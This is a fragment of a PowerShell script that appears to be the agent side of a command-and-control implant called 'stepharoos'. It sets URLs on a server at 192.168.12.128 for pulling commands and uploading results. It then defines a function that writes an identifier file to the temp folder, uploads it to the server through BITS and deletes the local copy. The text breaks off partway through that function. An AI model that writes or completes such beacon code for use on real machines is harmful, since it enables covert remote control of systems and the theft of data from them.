...
$command_url = "http://192.168.12.128/commands/stepharoos.json"
$upload_url = "http://192.168.12.128/uploads/stepharoos_response.txt"
$notify_url = "http://192.168.12.128/uploads/notify.txt"
$local_command_file = "$Env:temp\stepharoos.json"
$local_result_file = "$Env:temp\stepharoos_response.txt"
$agentname = "stepharoos"

function Notify-Server {
    try {
        "identifier=$agentname" | Out-File -FilePath $Env:TEMP\stepharoos_notify.txt -Encoding utf8
        Start-BitsTransfer -Source $Env:TEMP\stepharoos_notify.txt -Destination $notify_url -TransferType Upload -ErrorAction Stop
        Remove-Item $Env:TEMP\stepharoos_notify.txt -Force
    } catch {
